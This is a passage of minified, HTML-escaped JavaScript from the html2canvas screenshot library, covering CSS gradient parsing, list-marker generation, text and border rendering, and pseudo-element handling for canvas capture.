/(from|to|color-stop)\\(([0-9\\.]+)?(?:,\\s)?((?:rgb|rgba)\\(\\d{1,3},\\s\\d{1,3},\\s\\d{1,3}(?:,\\s[0-9\\.]+)?\\))\\)/);stop=parseFloat(m3[2]);if(m3[1]===&quot;from&quot;){stop=0}if(m3[1]===&quot;to&quot;){stop=1}gradient.colorStops.push({color:m3[3],stop:stop})}}break;case&quot;-moz-linear-gradient&quot;:gradient={type:&quot;linear&quot;,x0:0,y0:0,x1:0,y1:0,colorStops:[]};m2=m1[2].match(/(\\d{1,3})%?\\s(\\d{1,3})%?/);if(m2){gradient.x0=(m2[1]*bounds.width)/100;gradient.y0=(m2[2]*bounds.height)/100;gradient.x1=bounds.width-gradient.x0;gradient.y1=bounds.height-gradient.y0}m2=m1[3].match(/((?:rgb|rgba)\\(\\d{1,3},\\s\\d{1,3},\\s\\d{1,3}(?:,\\s[0-9\\.]+)?\\)(?:\\s\\d{1,3}%)?)+/g);if(m2){m2Len=m2.length;step=1/Math.max(m2Len-1,1);for(i=0;i&lt;m2Len;i+=1){m3=m2[i].match(/((?:rgb|rgba)\\(\\d{1,3},\\s\\d{1,3},\\s\\d{1,3}(?:,\\s[0-9\\.]+)?\\))\\s*(\\d{1,3})?(%)?/);if(m3[2]){stop=parseFloat(m3[2]);if(m3[3]){stop/=100}}else{stop=i*step}gradient.colorStops.push({color:m3[1],stop:stop})}}break;case&quot;-webkit-radial-gradient&quot;:case&quot;-moz-radial-gradient&quot;:case&quot;-o-radial-gradient&quot;:gradient={type:&quot;circle&quot;,x0:0,y0:0,x1:bounds.width,y1:bounds.height,cx:0,cy:0,rx:0,ry:0,colorStops:[]};m2=m1[2].match(/(\\d{1,3})%?\\s(\\d{1,3})%?/);if(m2){gradient.cx=(m2[1]*bounds.width)/100;gradient.cy=(m2[2]*bounds.height)/100}m2=m1[3].match(/\\w+/);m3=m1[4].match(/[a-z\\-]*/);if(m2&amp;&amp;m3){switch(m3[0]){case&quot;farthest-corner&quot;:case&quot;cover&quot;:case&quot;&quot;:tl=Math.sqrt(Math.pow(gradient.cx,2)+Math.pow(gradient.cy,2));tr=Math.sqrt(Math.pow(gradient.cx,2)+Math.pow(gradient.y1-gradient.cy,2));br=Math.sqrt(Math.pow(gradient.x1-gradient.cx,2)+Math.pow(gradient.y1-gradient.cy,2));bl=Math.sqrt(Math.pow(gradient.x1-gradient.cx,2)+Math.pow(gradient.cy,2));gradient.rx=gradient.ry=Math.max(tl,tr,br,bl);break;case&quot;closest-corner&quot;:tl=Math.sqrt(Math.pow(gradient.cx,2)+Math.pow(gradient.cy,2));tr=Math.sqrt(Math.pow(gradient.cx,2)+Math.pow(gradient.y1-gradient.cy,2));br=Math.sqrt(Math.pow(gradient.x1-gradient.cx,2)+Math.pow(gradient.y1-gradient.cy,2));bl=Math.sqrt(Math.pow(gradient.x1-gradient.cx,2)+Math.pow(gradient.cy,2));gradient.rx=gradient.ry=Math.min(tl,tr,br,bl);break;case&quot;farthest-side&quot;:if(m2[0]===&quot;circle&quot;){gradient.rx=gradient.ry=Math.max(gradient.cx,gradient.cy,gradient.x1-gradient.cx,gradient.y1-gradient.cy)}else{gradient.type=m2[0];gradient.rx=Math.max(gradient.cx,gradient.x1-gradient.cx);gradient.ry=Math.max(gradient.cy,gradient.y1-gradient.cy)}break;case&quot;closest-side&quot;:case&quot;contain&quot;:if(m2[0]===&quot;circle&quot;){gradient.rx=gradient.ry=Math.min(gradient.cx,gradient.cy,gradient.x1-gradient.cx,gradient.y1-gradient.cy)}else{gradient.type=m2[0];gradient.rx=Math.min(gradient.cx,gradient.x1-gradient.cx);gradient.ry=Math.min(gradient.cy,gradient.y1-gradient.cy)}break}}m2=m1[5].match(/((?:rgb|rgba)\\(\\d{1,3},\\s\\d{1,3},\\s\\d{1,3}(?:,\\s[0-9\\.]+)?\\)(?:\\s\\d{1,3}(?:%|px))?)+/g);if(m2){m2Len=m2.length;step=1/Math.max(m2Len-1,1);for(i=0;i&lt;m2Len;i+=1){m3=m2[i].match(/((?:rgb|rgba)\\(\\d{1,3},\\s\\d{1,3},\\s\\d{1,3}(?:,\\s[0-9\\.]+)?\\))\\s*(\\d{1,3})?(%|px)?/);if(m3[2]){stop=parseFloat(m3[2]);if(m3[3]===&quot;%&quot;){stop/=100}else{stop/=bounds.width}}else{stop=i*step}gradient.colorStops.push({color:m3[1],stop:stop})}}break}}return gradient};function addScrollStops(grad){return function(colorStop){try{grad.addColorStop(colorStop.stop,colorStop.color)}catch(e){Util.log([&quot;failed to add color stop: &quot;,e,&quot;; tried to add: &quot;,colorStop])}}}Generate.Gradient=function(src,bounds){if(bounds.width===0||bounds.height===0){return}var canvas=document.createElement(&quot;canvas&quot;),ctx=canvas.getContext(&quot;2d&quot;),gradient,grad;canvas.width=bounds.width;canvas.height=bounds.height;gradient=_html2canvas.Generate.parseGradient(src,bounds);if(gradient){switch(gradient.type){case&quot;linear&quot;:grad=ctx.createLinearGradient(gradient.x0,gradient.y0,gradient.x1,gradient.y1);\r\ngradient.colorStops.forEach(addScrollStops(grad));ctx.fillStyle=grad;ctx.fillRect(0,0,bounds.width,bounds.height);break;case&quot;circle&quot;:grad=ctx.createRadialGradient(gradient.cx,gradient.cy,0,gradient.cx,gradient.cy,gradient.rx);gradient.colorStops.forEach(addScrollStops(grad));ctx.fillStyle=grad;ctx.fillRect(0,0,bounds.width,bounds.height);break;case&quot;ellipse&quot;:var canvasRadial=document.createElement(&quot;canvas&quot;),ctxRadial=canvasRadial.getContext(&quot;2d&quot;),ri=Math.max(gradient.rx,gradient.ry),di=ri*2;canvasRadial.width=canvasRadial.height=di;grad=ctxRadial.createRadialGradient(gradient.rx,gradient.ry,0,gradient.rx,gradient.ry,ri);gradient.colorStops.forEach(addScrollStops(grad));ctxRadial.fillStyle=grad;ctxRadial.fillRect(0,0,di,di);ctx.fillStyle=gradient.colorStops[gradient.colorStops.length-1].color;ctx.fillRect(0,0,canvas.width,canvas.height);ctx.drawImage(canvasRadial,gradient.cx-gradient.rx,gradient.cy-gradient.ry,2*gradient.rx,2*gradient.ry);break}}return canvas};Generate.ListAlpha=function(number){var tmp=&quot;&quot;,modulus;do{modulus=number%26;tmp=String.fromCharCode((modulus)+64)+tmp;number=number/26}while((number*26)&gt;26);return tmp};Generate.ListRoman=function(number){var romanArray=[&quot;M&quot;,&quot;CM&quot;,&quot;D&quot;,&quot;CD&quot;,&quot;C&quot;,&quot;XC&quot;,&quot;L&quot;,&quot;XL&quot;,&quot;X&quot;,&quot;IX&quot;,&quot;V&quot;,&quot;IV&quot;,&quot;I&quot;],decimal=[1000,900,500,400,100,90,50,40,10,9,5,4,1],roman=&quot;&quot;,v,len=romanArray.length;if(number&lt;=0||number&gt;=4000){return number}for(v=0;v&lt;len;v+=1){while(number&gt;=decimal[v]){number-=decimal[v];roman+=romanArray[v]}}return roman}})();function h2cRenderContext(width,height){var storage=[];return{storage:storage,width:width,height:height,clip:function(){storage.push({type:&quot;function&quot;,name:&quot;clip&quot;,&quot;arguments&quot;:arguments})},translate:function(){storage.push({type:&quot;function&quot;,name:&quot;translate&quot;,&quot;arguments&quot;:arguments})},fill:function(){storage.push({type:&quot;function&quot;,name:&quot;fill&quot;,&quot;arguments&quot;:arguments})},save:function(){storage.push({type:&quot;function&quot;,name:&quot;save&quot;,&quot;arguments&quot;:arguments})},restore:function(){storage.push({type:&quot;function&quot;,name:&quot;restore&quot;,&quot;arguments&quot;:arguments})},fillRect:function(){storage.push({type:&quot;function&quot;,name:&quot;fillRect&quot;,&quot;arguments&quot;:arguments})},createPattern:function(){storage.push({type:&quot;function&quot;,name:&quot;createPattern&quot;,&quot;arguments&quot;:arguments})},drawShape:function(){var shape=[];storage.push({type:&quot;function&quot;,name:&quot;drawShape&quot;,&quot;arguments&quot;:shape});return{moveTo:function(){shape.push({name:&quot;moveTo&quot;,&quot;arguments&quot;:arguments})},lineTo:function(){shape.push({name:&quot;lineTo&quot;,&quot;arguments&quot;:arguments})},arcTo:function(){shape.push({name:&quot;arcTo&quot;,&quot;arguments&quot;:arguments})},bezierCurveTo:function(){shape.push({name:&quot;bezierCurveTo&quot;,&quot;arguments&quot;:arguments})},quadraticCurveTo:function(){shape.push({name:&quot;quadraticCurveTo&quot;,&quot;arguments&quot;:arguments})}}},drawImage:function(){storage.push({type:&quot;function&quot;,name:&quot;drawImage&quot;,&quot;arguments&quot;:arguments})},fillText:function(){storage.push({type:&quot;function&quot;,name:&quot;fillText&quot;,&quot;arguments&quot;:arguments})},setVariable:function(variable,value){storage.push({type:&quot;variable&quot;,name:variable,&quot;arguments&quot;:value});return value}}}_html2canvas.Parse=function(images,options){window.scroll(0,0);var element=((options.elements===undefined)?document.body:options.elements[0]),numDraws=0,doc=element.ownerDocument,Util=_html2canvas.Util,support=Util.Support(options,doc),ignoreElementsRegExp=new RegExp(&quot;(&quot;+options.ignoreElements+&quot;)&quot;),body=doc.body,getCSS=Util.getCSS,pseudoHide=&quot;___html2canvas___pseudoelement&quot;,hidePseudoElements=doc.createElement(&quot;style&quot;);hidePseudoElements.innerHTML=&quot;.&quot;+pseudoHide+&#039;-before:before { content: &quot;&quot; !important; display: none !important; }&#039;+&quot;.&quot;+pseudoHide+&#039;-after:after { content: &quot;&quot; !important; display: none !important; }&#039;;body.appendChild(hidePseudoElements);images=images||{};function documentWidth(){return Math.max(Math.max(doc.body.scrollWidth,doc.documentElement.scrollWidth),Math.max(doc.body.offsetWidth,doc.documentElement.offsetWidth),Math.max(doc.body.clientWidth,doc.documentElement.clientWidth))}function documentHeight(){return Math.max(Math.max(doc.body.scrollHeight,doc.documentElement.scrollHeight),Math.max(doc.body.offsetHeight,doc.documentElement.offsetHeight),Math.max(doc.body.clientHeight,doc.documentElement.clientHeight))}function getCSSInt(element,attribute){var val=parseInt(getCSS(element,attribute),10);return(isNaN(val))?0:val}function renderRect(ctx,x,y,w,h,bgcolor){if(bgcolor!==&quot;transparent&quot;){ctx.setVariable(&quot;fillStyle&quot;,bgcolor);ctx.fillRect(x,y,w,h);numDraws+=1}}function capitalize(m,p1,p2){if(m.length&gt;0){return p1+p2.toUpperCase()}}function textTransform(text,transform){switch(transform){case&quot;lowercase&quot;:return text.toLowerCase();case&quot;capitalize&quot;:return text.replace(/(^|\\s|:|-|\\(|\\))([a-z])/g,capitalize);case&quot;uppercase&quot;:return text.toUpperCase();default:return text}}function noLetterSpacing(letter_spacing){return(/^(normal|none|0px)$/.test(letter_spacing))}function drawText(currentText,x,y,ctx){if(currentText!==null&amp;&amp;Util.trimText(currentText).length&gt;0){ctx.fillText(currentText,x,y);numDraws+=1}}function setTextVariables(ctx,el,text_decoration,color){var align=false,bold=getCSS(el,&quot;fontWeight&quot;),family=getCSS(el,&quot;fontFamily&quot;),size=getCSS(el,&quot;fontSize&quot;),shadows=Util.parseTextShadows(getCSS(el,&quot;textShadow&quot;));\r\nswitch(parseInt(bold,10)){case 401:bold=&quot;bold&quot;;break;case 400:bold=&quot;normal&quot;;break}ctx.setVariable(&quot;fillStyle&quot;,color);ctx.setVariable(&quot;font&quot;,[getCSS(el,&quot;fontStyle&quot;),getCSS(el,&quot;fontVariant&quot;),bold,size,family].join(&quot; &quot;));ctx.setVariable(&quot;textAlign&quot;,(align)?&quot;right&quot;:&quot;left&quot;);if(shadows.length){ctx.setVariable(&quot;shadowColor&quot;,shadows[0].color);ctx.setVariable(&quot;shadowOffsetX&quot;,shadows[0].offsetX);ctx.setVariable(&quot;shadowOffsetY&quot;,shadows[0].offsetY);ctx.setVariable(&quot;shadowBlur&quot;,shadows[0].blur)}if(text_decoration!==&quot;none&quot;){return Util.Font(family,size,doc)}}function renderTextDecoration(ctx,text_decoration,bounds,metrics,color){switch(text_decoration){case&quot;underline&quot;:renderRect(ctx,bounds.left,Math.round(bounds.top+metrics.baseline+metrics.lineWidth),bounds.width,1,color);break;case&quot;overline&quot;:renderRect(ctx,bounds.left,Math.round(bounds.top),bounds.width,1,color);break;case&quot;line-through&quot;:renderRect(ctx,bounds.left,Math.ceil(bounds.top+metrics.middle+metrics.lineWidth),bounds.width,1,color);break}}function getTextBounds(state,text,textDecoration,isLast,transform){var bounds;if(support.rangeBounds&amp;&amp;!transform){if(textDecoration!==&quot;none&quot;||Util.trimText(text).length!==0){bounds=textRangeBounds(text,state.node,state.textOffset)}state.textOffset+=text.length}else{if(state.node&amp;&amp;typeof state.node.nodeValue===&quot;string&quot;){var newTextNode=(isLast)?state.node.splitText(text.length):null;bounds=textWrapperBounds(state.node,transform);state.node=newTextNode}}return bounds}function textRangeBounds(text,textNode,textOffset){var range=doc.createRange();range.setStart(textNode,textOffset);range.setEnd(textNode,textOffset+text.length);return range.getBoundingClientRect()}function textWrapperBounds(oldTextNode,transform){var parent=oldTextNode.parentNode,wrapElement=doc.createElement(&quot;wrapper&quot;),backupText=oldTextNode.cloneNode(true);wrapElement.appendChild(oldTextNode.cloneNode(true));parent.replaceChild(wrapElement,oldTextNode);var bounds=transform?Util.OffsetBounds(wrapElement):Util.Bounds(wrapElement);parent.replaceChild(backupText,wrapElement);return bounds}function renderText(el,textNode,stack){var ctx=stack.ctx,color=getCSS(el,&quot;color&quot;),textDecoration=getCSS(el,&quot;textDecoration&quot;),textAlign=getCSS(el,&quot;textAlign&quot;),metrics,textList,state={node:textNode,textOffset:0};if(Util.trimText(textNode.nodeValue).length&gt;0){textNode.nodeValue=textTransform(textNode.nodeValue,getCSS(el,&quot;textTransform&quot;));textAlign=textAlign.replace([&quot;-webkit-auto&quot;],[&quot;auto&quot;]);textList=(!options.letterRendering&amp;&amp;/^(left|right|justify|auto)$/.test(textAlign)&amp;&amp;noLetterSpacing(getCSS(el,&quot;letterSpacing&quot;)))?textNode.nodeValue.split(/(\\b| )/):textNode.nodeValue.split(&quot;&quot;);metrics=setTextVariables(ctx,el,textDecoration,color);if(options.chinese){textList.forEach(function(word,index){if(/.*[\\u4E00-\\u9FA5].*$/.test(word)){word=word.split(&quot;&quot;);word.unshift(index,1);textList.splice.apply(textList,word)}})}textList.forEach(function(text,index){var bounds=getTextBounds(state,text,textDecoration,(index&lt;textList.length-1),stack.transform.matrix);if(bounds){drawText(text,bounds.left,bounds.bottom,ctx);renderTextDecoration(ctx,textDecoration,bounds,metrics,color)}})}}function listPosition(element,val){var boundElement=doc.createElement(&quot;boundelement&quot;),originalType,bounds;boundElement.style.display=&quot;inline&quot;;originalType=element.style.listStyleType;element.style.listStyleType=&quot;none&quot;;boundElement.appendChild(doc.createTextNode(val));element.insertBefore(boundElement,element.firstChild);bounds=Util.Bounds(boundElement);element.removeChild(boundElement);element.style.listStyleType=originalType;return bounds}function elementIndex(el){var i=-1,count=1,childs=el.parentNode.childNodes;if(el.parentNode){while(childs[++i]!==el){if(childs[i].nodeType===1){count++}}return count}else{return -1}}function listItemText(element,type){var currentIndex=elementIndex(element),text;switch(type){case&quot;decimal&quot;:text=currentIndex;break;case&quot;decimal-leading-zero&quot;:text=(currentIndex.toString().length===1)?currentIndex=&quot;0&quot;+currentIndex.toString():currentIndex.toString();break;case&quot;upper-roman&quot;:text=_html2canvas.Generate.ListRoman(currentIndex);break;case&quot;lower-roman&quot;:text=_html2canvas.Generate.ListRoman(currentIndex).toLowerCase();break;case&quot;lower-alpha&quot;:text=_html2canvas.Generate.ListAlpha(currentIndex).toLowerCase();break;case&quot;upper-alpha&quot;:text=_html2canvas.Generate.ListAlpha(currentIndex);break}return text+&quot;. &quot;}function renderListItem(element,stack,elBounds){var x,text,ctx=stack.ctx,type=getCSS(element,&quot;listStyleType&quot;),listBounds;if(/^(decimal|decimal-leading-zero|upper-alpha|upper-latin|upper-roman|lower-alpha|lower-greek|lower-latin|lower-roman)$/i.test(type)){text=listItemText(element,type);listBounds=listPosition(element,text);setTextVariables(ctx,element,&quot;none&quot;,getCSS(element,&quot;color&quot;));if(getCSS(element,&quot;listStylePosition&quot;)===&quot;inside&quot;){ctx.setVariable(&quot;textAlign&quot;,&quot;left&quot;);x=elBounds.left}else{return}drawText(text,x,listBounds.bottom,ctx)}}function loadImage(src){var img=images[src];return(img&amp;&amp;img.succeeded===true)?img.img:false\r\n}function clipBounds(src,dst){var x=Math.max(src.left,dst.left),y=Math.max(src.top,dst.top),x2=Math.min((src.left+src.width),(dst.left+dst.width)),y2=Math.min((src.top+src.height),(dst.top+dst.height));return{left:x,top:y,width:x2-x,height:y2-y}}function setZ(element,stack,parentStack){var newContext,isPositioned=stack.cssPosition!==&quot;static&quot;,zIndex=isPositioned?getCSS(element,&quot;zIndex&quot;):&quot;auto&quot;,opacity=getCSS(element,&quot;opacity&quot;),isFloated=getCSS(element,&quot;cssFloat&quot;)!==&quot;none&quot;;stack.zIndex=newContext=h2czContext(zIndex);newContext.isPositioned=isPositioned;newContext.isFloated=isFloated;newContext.opacity=opacity;newContext.ownStacking=(zIndex!==&quot;auto&quot;||opacity&lt;1);if(parentStack){parentStack.zIndex.children.push(stack)}}function renderImage(ctx,element,image,bounds,borders){var paddingLeft=getCSSInt(element,&quot;paddingLeft&quot;),paddingTop=getCSSInt(element,&quot;paddingTop&quot;),paddingRight=getCSSInt(element,&quot;paddingRight&quot;),paddingBottom=getCSSInt(element,&quot;paddingBottom&quot;);drawImage(ctx,image,0,0,image.width,image.height,bounds.left+paddingLeft+borders[3].width,bounds.top+paddingTop+borders[0].width,bounds.width-(borders[1].width+borders[3].width+paddingLeft+paddingRight),bounds.height-(borders[0].width+borders[2].width+paddingTop+paddingBottom))}function getBorderData(element){return[&quot;Top&quot;,&quot;Right&quot;,&quot;Bottom&quot;,&quot;Left&quot;].map(function(side){return{width:getCSSInt(element,&quot;border&quot;+side+&quot;Width&quot;),color:getCSS(element,&quot;border&quot;+side+&quot;Color&quot;)}})}function getBorderRadiusData(element){return[&quot;TopLeft&quot;,&quot;TopRight&quot;,&quot;BottomRight&quot;,&quot;BottomLeft&quot;].map(function(side){return getCSS(element,&quot;border&quot;+side+&quot;Radius&quot;)})}var getCurvePoints=(function(kappa){return function(x,y,r1,r2){var ox=(r1)*kappa,oy=(r2)*kappa,xm=x+r1,ym=y+r2;return{topLeft:bezierCurve({x:x,y:ym},{x:x,y:ym-oy},{x:xm-ox,y:y},{x:xm,y:y}),topRight:bezierCurve({x:x,y:y},{x:x+ox,y:y},{x:xm,y:ym-oy},{x:xm,y:ym}),bottomRight:bezierCurve({x:xm,y:y},{x:xm,y:y+oy},{x:x+ox,y:ym},{x:x,y:ym}),bottomLeft:bezierCurve({x:xm,y:ym},{x:xm-ox,y:ym},{x:x,y:y+oy},{x:x,y:y})}}})(4*((Math.sqrt(2)-1)/3));function bezierCurve(start,startControl,endControl,end){var lerp=function(a,b,t){return{x:a.x+(b.x-a.x)*t,y:a.y+(b.y-a.y)*t}};return{start:start,startControl:startControl,endControl:endControl,end:end,subdivide:function(t){var ab=lerp(start,startControl,t),bc=lerp(startControl,endControl,t),cd=lerp(endControl,end,t),abbc=lerp(ab,bc,t),bccd=lerp(bc,cd,t),dest=lerp(abbc,bccd,t);return[bezierCurve(start,ab,abbc,dest),bezierCurve(dest,bccd,cd,end)]},curveTo:function(borderArgs){borderArgs.push([&quot;bezierCurve&quot;,startControl.x,startControl.y,endControl.x,endControl.y,end.x,end.y])},curveToReversed:function(borderArgs){borderArgs.push([&quot;bezierCurve&quot;,endControl.x,endControl.y,startControl.x,startControl.y,start.x,start.y])}}}function parseCorner(borderArgs,radius1,radius2,corner1,corner2,x,y){if(radius1[0]&gt;0||radius1[1]&gt;0){borderArgs.push([&quot;line&quot;,corner1[0].start.x,corner1[0].start.y]);corner1[0].curveTo(borderArgs);corner1[1].curveTo(borderArgs)}else{borderArgs.push([&quot;line&quot;,x,y])}if(radius2[0]&gt;0||radius2[1]&gt;0){borderArgs.push([&quot;line&quot;,corner2[0].start.x,corner2[0].start.y])}}function drawSide(borderData,radius1,radius2,outer1,inner1,outer2,inner2){var borderArgs=[];if(radius1[0]&gt;0||radius1[1]&gt;0){borderArgs.push([&quot;line&quot;,outer1[1].start.x,outer1[1].start.y]);outer1[1].curveTo(borderArgs)}else{borderArgs.push([&quot;line&quot;,borderData.c1[0],borderData.c1[1]])}if(radius2[0]&gt;0||radius2[1]&gt;0){borderArgs.push([&quot;line&quot;,outer2[0].start.x,outer2[0].start.y]);outer2[0].curveTo(borderArgs);borderArgs.push([&quot;line&quot;,inner2[0].end.x,inner2[0].end.y]);inner2[0].curveToReversed(borderArgs)}else{borderArgs.push([&quot;line&quot;,borderData.c2[0],borderData.c2[1]]);borderArgs.push([&quot;line&quot;,borderData.c3[0],borderData.c3[1]])}if(radius1[0]&gt;0||radius1[1]&gt;0){borderArgs.push([&quot;line&quot;,inner1[1].end.x,inner1[1].end.y]);inner1[1].curveToReversed(borderArgs)}else{borderArgs.push([&quot;line&quot;,borderData.c4[0],borderData.c4[1]])}return borderArgs}function calculateCurvePoints(bounds,borderRadius,borders){var x=bounds.left,y=bounds.top,width=bounds.width,height=bounds.height,tlh=borderRadius[0][0],tlv=borderRadius[0][1],trh=borderRadius[1][0],trv=borderRadius[1][1],brh=borderRadius[2][0],brv=borderRadius[2][1],blh=borderRadius[3][0],blv=borderRadius[3][1],topWidth=width-trh,rightHeight=height-brv,bottomWidth=width-brh,leftHeight=height-blv;return{topLeftOuter:getCurvePoints(x,y,tlh,tlv).topLeft.subdivide(0.5),topLeftInner:getCurvePoints(x+borders[3].width,y+borders[0].width,Math.max(0,tlh-borders[3].width),Math.max(0,tlv-borders[0].width)).topLeft.subdivide(0.5),topRightOuter:getCurvePoints(x+topWidth,y,trh,trv).topRight.subdivide(0.5),topRightInner:getCurvePoints(x+Math.min(topWidth,width+borders[3].width),y+borders[0].width,(topWidth&gt;width+borders[3].width)?0:trh-borders[3].width,trv-borders[0].width).topRight.subdivide(0.5),bottomRightOuter:getCurvePoints(x+bottomWidth,y+rightHeight,brh,brv).bottomRight.subdivide(0.5),bottomRightInner:getCurvePoints(x+Math.min(bottomWidth,width+borders[3].width),y+Math.min(rightHeight,height+borders[0].width),Math.max(0,brh-borders[1].width),Math.max(0,brv-borders[2].width)).bottomRight.subdivide(0.5),bottomLeftOuter:getCurvePoints(x,y+leftHeight,blh,blv).bottomLeft.subdivide(0.5),bottomLeftInner:getCurvePoints(x+borders[3].width,y+leftHeight,Math.max(0,blh-borders[3].width),Math.max(0,blv-borders[2].width)).bottomLeft.subdivide(0.5)}\r\n}function getBorderClip(element,borderPoints,borders,radius,bounds){var backgroundClip=getCSS(element,&quot;backgroundClip&quot;),borderArgs=[];switch(backgroundClip){case&quot;content-box&quot;:case&quot;padding-box&quot;:parseCorner(borderArgs,radius[0],radius[1],borderPoints.topLeftInner,borderPoints.topRightInner,bounds.left+borders[3].width,bounds.top+borders[0].width);parseCorner(borderArgs,radius[1],radius[2],borderPoints.topRightInner,borderPoints.bottomRightInner,bounds.left+bounds.width-borders[1].width,bounds.top+borders[0].width);parseCorner(borderArgs,radius[2],radius[3],borderPoints.bottomRightInner,borderPoints.bottomLeftInner,bounds.left+bounds.width-borders[1].width,bounds.top+bounds.height-borders[2].width);parseCorner(borderArgs,radius[3],radius[0],borderPoints.bottomLeftInner,borderPoints.topLeftInner,bounds.left+borders[3].width,bounds.top+bounds.height-borders[2].width);break;default:parseCorner(borderArgs,radius[0],radius[1],borderPoints.topLeftOuter,borderPoints.topRightOuter,bounds.left,bounds.top);parseCorner(borderArgs,radius[1],radius[2],borderPoints.topRightOuter,borderPoints.bottomRightOuter,bounds.left+bounds.width,bounds.top);parseCorner(borderArgs,radius[2],radius[3],borderPoints.bottomRightOuter,borderPoints.bottomLeftOuter,bounds.left+bounds.width,bounds.top+bounds.height);parseCorner(borderArgs,radius[3],radius[0],borderPoints.bottomLeftOuter,borderPoints.topLeftOuter,bounds.left,bounds.top+bounds.height);break}return borderArgs}function parseBorders(element,bounds,borders){var x=bounds.left,y=bounds.top,width=bounds.width,height=bounds.height,borderSide,bx,by,bw,bh,borderArgs,borderRadius=getBorderRadiusData(element),borderPoints=calculateCurvePoints(bounds,borderRadius,borders),borderData={clip:getBorderClip(element,borderPoints,borders,borderRadius,bounds),borders:[]};for(borderSide=0;borderSide&lt;4;borderSide++){if(borders[borderSide].width&gt;0){bx=x;by=y;bw=width;bh=height-(borders[2].width);switch(borderSide){case 0:bh=borders[0].width;borderArgs=drawSide({c1:[bx,by],c2:[bx+bw,by],c3:[bx+bw-borders[1].width,by+bh],c4:[bx+borders[3].width,by+bh]},borderRadius[0],borderRadius[1],borderPoints.topLeftOuter,borderPoints.topLeftInner,borderPoints.topRightOuter,borderPoints.topRightInner);break;case 1:bx=x+width-(borders[1].width);bw=borders[1].width;borderArgs=drawSide({c1:[bx+bw,by],c2:[bx+bw,by+bh+borders[2].width],c3:[bx,by+bh],c4:[bx,by+borders[0].width]},borderRadius[1],borderRadius[2],borderPoints.topRightOuter,borderPoints.topRightInner,borderPoints.bottomRightOuter,borderPoints.bottomRightInner);break;case 2:by=(by+height)-(borders[2].width);bh=borders[2].width;borderArgs=drawSide({c1:[bx+bw,by+bh],c2:[bx,by+bh],c3:[bx+borders[3].width,by],c4:[bx+bw-borders[3].width,by]},borderRadius[2],borderRadius[3],borderPoints.bottomRightOuter,borderPoints.bottomRightInner,borderPoints.bottomLeftOuter,borderPoints.bottomLeftInner);break;case 3:bw=borders[3].width;borderArgs=drawSide({c1:[bx,by+bh+borders[2].width],c2:[bx,by],c3:[bx+bw,by+borders[0].width],c4:[bx+bw,by+bh]},borderRadius[3],borderRadius[0],borderPoints.bottomLeftOuter,borderPoints.bottomLeftInner,borderPoints.topLeftOuter,borderPoints.topLeftInner);break}borderData.borders.push({args:borderArgs,color:borders[borderSide].color})}}return borderData}function createShape(ctx,args){var shape=ctx.drawShape();args.forEach(function(border,index){shape[(index===0)?&quot;moveTo&quot;:border[0]+&quot;To&quot;].apply(null,border.slice(1))});return shape}function renderBorders(ctx,borderArgs,color){if(color!==&quot;transparent&quot;){ctx.setVariable(&quot;fillStyle&quot;,color);createShape(ctx,borderArgs);ctx.fill();numDraws+=1}}function renderFormValue(el,bounds,stack){var valueWrap=doc.createElement(&quot;valuewrap&quot;),cssPropertyArray=[&quot;lineHeight&quot;,&quot;textAlign&quot;,&quot;fontFamily&quot;,&quot;color&quot;,&quot;fontSize&quot;,&quot;paddingLeft&quot;,&quot;paddingTop&quot;,&quot;width&quot;,&quot;height&quot;,&quot;border&quot;,&quot;borderLeftWidth&quot;,&quot;borderTopWidth&quot;],textValue,textNode;cssPropertyArray.forEach(function(property){try{valueWrap.style[property]=getCSS(el,property)}catch(e){Util.log(&quot;html2canvas: Parse: Exception caught in renderFormValue: &quot;+e.message)}});valueWrap.style.borderColor=&quot;black&quot;;valueWrap.style.borderStyle=&quot;solid&quot;;valueWrap.style.display=&quot;block&quot;;valueWrap.style.position=&quot;absolute&quot;;if(/^(submit|reset|button|text|password)$/.test(el.type)||el.nodeName===&quot;SELECT&quot;){valueWrap.style.lineHeight=getCSS(el,&quot;height&quot;)}valueWrap.style.top=bounds.top+&quot;px&quot;;valueWrap.style.left=bounds.left+&quot;px&quot;;textValue=(el.nodeName===&quot;SELECT&quot;)?(el.options[el.selectedIndex]||0).text:el.value;if(!textValue){textValue=el.placeholder}textNode=doc.createTextNode(textValue);valueWrap.appendChild(textNode);body.appendChild(valueWrap);renderText(el,textNode,stack);body.removeChild(valueWrap)}function drawImage(ctx){ctx.drawImage.apply(ctx,Array.prototype.slice.call(arguments,1));numDraws+=1}function getPseudoElement(el,which){var elStyle=window.getComputedStyle(el,which);if(!elStyle||!elStyle.content||elStyle.content===&quot;none&quot;||elStyle.content===&quot;-moz-alt-content&quot;||elStyle.display===&quot;none&quot;){return}var content=elStyle.content+&quot;&quot;,first=content.substr(0,1);\r\nif(first===content.substr(content.length-1)&amp;&amp;first.match(/&#039;|&quot;/)){content=content.substr(1,content.length-2)}var isImage=content.substr(0,3)===&quot;url&quot;,elps=document.createElement(isImage?&quot;img&quot;:&quot;span&quot;);elps.className=pseudoHide+&quot;-before &quot;+pseudoHide+&quot;-after&quot;;Object.keys(elStyle).filter(indexedProperty).forEach(function(prop){try{elps.style[prop]=elStyle[prop]}catch(e){Util.log([&quot;Tried to assign readonly property &quot;,prop,&quot;Error:&quot;,e])}});if(isImage){elps.src=Util.parseBackgroundImage(content)[0].args[0]}else{elps.innerHTML=content}return elps}function indexedProperty(property){return(isNaN(window.parseInt(property,10)))}function injectPseudoElements(el,stack){var before=getPseudoElement(el,&quot;:before&quot;),after=getPseudoElement(el,&quot;:after&quot;);if(!before&amp;&amp;!after){return}if(before){el.className+=&quot; &quot;+pseudoHide+&quot;-before&quot;;el.parentNode.insertBefore(before,el);parseElement(before,stack,true);el.parentNode.removeChild(before);el.className=el.className.replace(pseudoHide+&quot;-before&quot;,&quot;&quot;).trim()}if(after){el.className+=&quot; &quot;+pseudoHide+&quot;-after&quot;;el.appendChild(after);parseElement(after,stack,true);el.removeChild(after);el.className=el.className.replace(pseudoHide+&quot;-after&quot;,&quot;&quot;).trim()}}function renderBackgroundRepeat(ctx,image,backgroundPosition,bounds){var offsetX=Math.round(bounds.left+backgroundPosition.left),offsetY=Math.round(bounds.top+backgroundPosition.top);ctx.createPattern(image);ctx.translate(offsetX,offsetY);ctx.fill();ctx.translate(-offsetX,-offsetY)}function backgroundRepeatShape(ctx,image,backgroundPosition,bounds,left,top,width,height){var 